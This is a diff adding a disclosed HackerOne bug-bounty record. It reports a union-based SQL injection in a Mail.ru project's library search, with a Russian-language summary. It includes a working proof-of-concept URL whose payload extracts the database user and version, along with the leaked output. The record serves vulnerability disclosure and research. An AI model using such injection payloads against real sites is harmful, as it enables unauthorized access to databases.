@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/116508
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:24.02.2016 10:45:25
+
+Summary:
+SQL injection in out-of-scope project
+Добрый день.  Функция поиска уязвимо к атаке SQL Injection. Вектор атаки - Union Based
+
+PoC. 
+
+http://3k.mail.ru/info/library/index.php?obj=cat&id=212&searchST='+and+0+union+select+1,2,concat_ws(0x3a,user(),version()),4,5,6,7-- a
+
+Вывод на странице:  master3k@localhost:5.0.90-log
